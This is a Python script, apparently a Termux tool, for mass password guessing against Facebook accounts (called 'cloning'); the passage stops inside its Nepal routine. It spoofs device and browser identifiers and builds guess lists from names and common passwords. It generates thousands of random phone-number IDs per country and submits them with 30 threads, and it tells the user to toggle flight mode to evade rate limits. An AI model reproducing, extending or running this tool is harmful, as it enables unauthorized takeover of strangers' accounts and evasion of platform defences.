#__________________| IMPORT |__________________#
from os import path
import requests,random,uuid,string,hashlib,json
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
def clear():
        os.system('clear')
print(f'\x1b[38;5;8m[\x1b[1;97m=\x1b[38;5;8m]\x1b[38;5;46m INSTALLED SYSTEM ')
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python HATS.py')
        

    

#__________________| ETC |__________________#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'it_IT'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Telenor'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Telenor"
                        sim_id+=fbcr
        else:
                fbcr = 'Telenor'
                sim_id+=fbcr
except:
        fbcr = "Telenor"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
   

#__________________| LOOP |__________________#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
#__________________| COLOUR |__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________| LINE |__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
import random

def ua_api():
    # 
    return f"FBAN/Mozilla; Android 10; Chrome 120.0.0.0; K AppleWebKit/537.36; Mobile Safari/537.36]"





#__________________| UA |__________________#
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
agents = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/230.0.474234691 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/94.0.4606.76 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/98.0.4758.97 Mobile/15E148 Safari/635.1'
'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/105.0.5195.129 Mobile/15E148 Safari/604.1'
'Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; Pearl K3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 9; ALP-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; V2026 Build/RP1A.200720.012; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.47'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Z981) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 EdgA/105.0.1343.42'
'Mozilla/5.0 (Linux; Android 11; SM-A125W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74'
'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Infinix X6816) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 HuaweiBrowser/12.1.1.324 HMSCore/6.7.0.322'
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0'
'Opera/5.11 (Windows 98; U) [en]'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/6.0 (Windows 2000; U) [fr]'
'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]'
'Opera/7.03 (Windows NT 5.0; U) [en]'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
'Opera/9.02 (Windows XP; U; ru)'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0'
'Opera/9.51 (Macintosh; Intel Mac OS X; U; en)'
'Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1'
'Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00'
'Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00'
'Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01'
'Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10'
'Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11'
'Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4'
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)'
'Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91'
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0'
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25'
'Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]'
'Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
"Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5647.206 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Magnet_G30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5663.218 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; TVBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5616.215 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5622.208 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Lenovo TB-J606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5667.195 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; e-tab 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5669.213 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; MRX-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5645.215 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.219 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5658.220 Safari/537.36 OPR/97.0.3429.147",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5624.206 Safari/537.36 OPR/97.0.3248.58",]  
#__________________| LOGO |__________________#
logo=(f"""
 \033[1;32m .88b  d88. d888888b  .o88b. db   dD db    db 
 \033[1;32m 88'YbdP`88   `88'   d8P  Y8 88 ,8P' `8b  d8' 
 \033[1;32m 88  88  88    88    8P      88,8P    `8bd8'  
 \033[1;32m 88  88  88    88    8b      88`8b      88    
 \033[1;32m 88  88  88   .88.   Y8b  d8 88 `88.    88    
 \033[1;32m YP  YP  YP Y888888P  `Y88P' YP   YD    YP            

\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

\033[1;32m[\033[1;31m✓\033[1;32m] Author     : M I C K Y
\033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : https://github.com/PRIVATE 
\033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : __Micky
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × Random
\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35mTesting
\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________| MAIN |__________________#
def clear():
	os.system('clear')
	print(logo)
	

def menu():
        try:
              #  approval()
                        clear()
                        print(f'{G}[{A}1{G}]{G} FILE CLONING \n{G}[{A}2{G}]{G} RANDOM CLONING\n{G}[{A}3{G}]{G} CONTACT TOOL OWNER\n{G}[{A}0{G}]{G} EXIT TOOL')
                        linex()
                        xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/Hats.txt ');linex()
                                file = input(f'{G}[{A}?{G}]{G} FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]\n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]');linex()
                                mthd=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                clear()
                                plist = []
                                print(f'                  PASSWORD SYSTEM');linex();print(f'{G}[{A}1{G}]{G} AUTO PASSWORD CLONE\n{G}[{A}2{G}]{G} CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('First Last')
                                        plist.append('first12345')
                                        plist.append('first1234')
                                        plist.append('first123')
                                        plist.append('first12')
                                        plist.append('first1')
                                        plist.append('first11')
                                        plist.append('first111')
                                        plist.append('first1212')
                                        plist.append('first1122')
                                        plist.append('first22')
                                        plist.append('first@')
                                        plist.append('@first@')
                                        plist.append('first@@')
                                        plist.append('last12345')
                                        plist.append('last1234')
                                        plist.append('last123')
                                        plist.append('last12')
                                        plist.append('last1')
                                        plist.append('last11')
                                        plist.append('last111')
                                        plist.append('last1212')
                                        plist.append('last1122')
                                        plist.append('last@')
                                        plist.append('@last@')
                                        plist.append('last@@')
                                        plist.append('last22')
                                        plist.append('firstlast1234')
                                        plist.append('firstlast123')
                                        plist.append('firstlast12')
                                        plist.append('first123456')
                                        plist.append('first12345')
                                        plist.append('first1234')
                                        plist.append('first123')
                                        plist.append('first12')
                                        plist.append('first111')
                                        plist.append('first@1')
                                        plist.append('first@123')
                                        plist.append('firstfirst')
                                        plist.append('firstlast')
                                        plist.append('firstlast123')
                                        plist.append('last123')
                                        plist.append('first first')
                                        plist.append('first last')
                                        plist.append('pak123')
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('57273200')
                                        plist.append('59039200')
                                        plist.append('57575751')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD LIMIT : '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : firstlast{G}/{G}first@@{G}/{G}first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PASSWORD NO {i+1} :{A} '))
                                clear()
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] CP ID SHOW (y/n) ')
                                linex()
                                cx=input(f'{G}[{A}?{G}]{G} CHOICE : ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNT :{A} '+total_ids+f' {G}<{A}-{G}> METHOD :{A} M{mthd}')
                                        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
                                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
                                menu()
                        elif xd in ['2','02']:
                                randm()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100057497148585');menu()
                        elif xd in ['0','05']:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
                        else:
                                exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] OPTION NOT FOUND IN MENU...')
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] NO INTERNET CONNECTION...')
                exit()
#__________________| RANDOM |__________________#
def randm():
    clear()
    print(f'{G}[{A}1{G}]{G} BANGLADESH CLONING ')
    print(f'{G}[{A}2{G}]{G} INDIA CLONING ')
    print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
    print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
    print(f'{G}[{A}5{G}]{G} AFGHANISTAN CLONING ')
    print(f'{G}[{A}0{G}]{G} BACK TO MENU ');linex()
    option=input(f'{G}[{A}?{G}]{G} CHOICE : ')
    if option in ['1','A']:
        bd()
    elif option in ['2','B']:
    	india()
    elif option in ['3','C']:
    	nepal()
    elif option in ['4','D']:
    	pakistan()
    elif option in ['5','E']:
    	afghanistan()
    elif option in ['6','00']:
    	gmail()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 017 | 019 | 018 | 016 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp=''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| INDIA |__________________#
def india():
		user=[]
		clear()
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : +91639 | +91934 | +91902 | +91937 ');linex()
		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
		clear()
		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
		for nmbr in range(limit):
			nmp = "". join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as habib:	
			clear()
			tl = str(len(user))
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
			for psx in user:
				uid = code+psx
				passlist = [psx,uid[:8],'57273200','59039200','57575751']
				if mthd in ['1','01']:
					habib.submit(rndm1,uid,passlist)
				if mthd in ['2','02']:
					habib.submit(rndm2,uid,passlist)
				if mthd in ['3','03']:
					habib.submit(rndm3,uid,passlist)
		print('\033[1;37m')
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS COMPLETED')
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID : '+str(len(oks)))
		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
		menu()
#__________________| NEPAL |__________________#
def nepal():
		user=[]
		clear()
